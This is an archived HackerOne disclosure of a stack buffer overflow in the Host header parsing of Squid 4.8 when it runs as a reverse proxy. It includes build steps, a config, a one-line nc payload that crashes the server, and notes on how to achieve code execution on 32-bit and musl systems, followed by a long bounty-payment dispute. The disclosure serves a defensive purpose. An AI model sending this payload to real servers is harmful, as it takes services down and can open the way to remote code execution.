---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/classic-buffer-overflow
  - env/web
  - vuln/path-traversal
  - vuln/code-injection
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: "Classic Buffer Overflow"
enriched: true
body: true
date: 2021-08-26
submitted: 2020-01-20T21:46:26.550Z
bounty_usd: null
votes: 17
cve: []
program: "[[programs/ibb|Internet Bug Bounty]]"
reporter: "guido"
source: "https://hackerone.com/reports/778610"
title: "Squid as reverse proxy RCE and data leak"
---
# Squid as reverse proxy RCE and data leak

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 17 | **Program:** Internet Bug Bounty | **Disclosed:** 2021-08-26

- Report: [https://hackerone.com/reports/778610](https://hackerone.com/reports/778610)
- CWE: Classic Buffer Overflow
- Submitted: 2020-01-20T21:46:26.550Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
This was a very difficult experience as Squid maintainers took a long time to answer. I tried getting help from HackerOne support, Dropbox support and the Internet Bug Bounty (never e-mailed me back) to no avail. What could have taken a few days took months.

The vulnerability concerns a stack buffer overflow (write) in parsing of the Host header if Squid acts as a reverse proxy.

The bug is fixed in Squid 4.10 released on 20 Jan 2020 which can be found here: http://www.squid-cache.org/Versions/v4/

## Steps To Reproduce:
```
mkdir squid-poc
cd squid-poc/
wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'
tar zxf SQUID_4_8.tar.gz
mkdir squid-install
cd squid-SQUID_4_8/
autoreconf -if
./configure --prefix=$(realpath ../squid-install)
make -j$(nproc)
make install
cd ../squid-install/sbin/
```

Create a file ```squid.conf``` with this contents. This is based on the instructions at https://wiki.squid-cache.org/ConfigExamples/Reverse/BasicAccelerator

```
http_port 9999 accel defaultsite=127.0.0.1 vhost vport=1
cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel
acl our_sites dstdomain your.main.website.name
http_access allow our_sites
cache_peer_access myAccel allow our_sites
cache_peer_access myAccel deny all
```

Run Squid:

The following is a oneliner to launch Squid and send the payload that crashes it:

```
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc localhost 9999
```

Output:

```
[1] 19871
*** buffer overflow detected ***: ./squid terminated
[1]+  Aborted                 (core dumped) ./squid -N -f squid.conf
```

## Supporting Material/References:

Exploitation with -fstack-protector enabled is impossible.
Some compilers don't enable -fstack-protector by default (like Clang without optimization flags).

Without stack protector, exploitation is relatively easy on 32 bit as valid addresses normally don't require a leading zero byte (which cannot be written by the payload, because the affected code treats it as a null-terminated string).
On 64 bit it is more difficult, but not necessarily impossible. Rather than overwriting the return address, changing the value of a (for instance boolean) configuration variable may be used.

Unlike glibc, musl libc is used does not write a NULL byte to the destination buffer if the size argument is very large, which happens here due to an overflowing subtraction. Hence, exploitation may be easier on systems that use musl libc, like OpenWRT and Alpine Linux.

There is also a small data leak for payloads of a particular length. This does not crash Squid, and makes it return uninitialized bytes located after the string buffer, usually just several (until a NULL byte is reached).

Fix: https://github.com/squid-cache/squid/pull/519

## Impact

Remote code execution (under certain circumstances), crashing a server (under most circumstances), leaking data from the server (under most circumstances).

## Timeline

- **Report Filed**
- **2020-01-21** @h1_analyst_ava: Hi @guido,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@sodacan
- **Report Needs More Info**
- **Report New**
- **2020-01-21** @guido: If you have doubts I'm guidovranken on Github, I can create a gist with a contents of your choosing to prove this.
- **Report Needs More Info**
- **Report New**
- **2020-02-04** @guido: Here you go:

http://www.squid-cache.org/Advisories/SQUID-2020_1.txt
- **2020-02-04** @h1_analyst_ava: Hi @guido,
Thanks for the requested updated information. The H1 team is taking a look at it now and will let you know if there are any questions or comments. Your input is appreciated.
@sodacan
- **Report Triaged**
- **2020-02-04** @guido: Thank you.
- **2020-02-10** @guido: Hello @sodacan 

is there progress on this report? What is the ETA of the final ruling?

Thanks
- **2020-02-15** @guido: Update please?
- **2020-02-19** @guido: What's going on? If you don't respond, I will request mediation.
- **Hacker Requested Mediation**
- **2020-02-28** @lasagna: Hi @guido , first of all sorry for the delay. Unfortunately we haven't heard back from the team yet regarding your submission. I'll ping them again and see if we can get an update on this. Thank you for your continued patience.
- **2020-03-09** @guido: Update please
- **2020-03-11** @h1_analyst_ava: Hi @guido,
There are still no updates yet. Let me see where this is at in terms of status.
@sodacan
- **2020-03-18** @guido: Who are you trying to contact exactly? The Internet Bug Bounty? Dropbox?
- **2020-03-19** @h1_analyst_ava: For this report is would be the Squid Proxy team.
- **2020-03-21** @guido: Check your spam folder. Mail from both the Squid maintainers consistently ended up in my spam folder for some reason.
- **2020-03-28** @guido: Did you find anything in your spam folder? Why do you need the Squid Proxy team? Isn't the advisory sufficient?
- **2020-03-31** @h1_analyst_ava: This report is in the hands of the Squid Cache (IBB) team. They have not provided any updates. We cannot give a timeline as to when this will happen. As soon as any updates are provided we will be sure to notify you. Thank you for your patience @guido
@sodacan
- **2021-01-02** @guido: I've reported HackerOne to the Federal Trade Commission for committing fraud. Despite being unable or unwilling to pay, you continue to run this program, which is clearly fraud.
- **Report Resolved**
- **2021-07-23** @reed: Ugh, some settings are not set up correctly, so can't pay out the bounty right now. Going to try to get it fixed tomorrow and get your bounty awarded. Sorry about the extra delay!
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
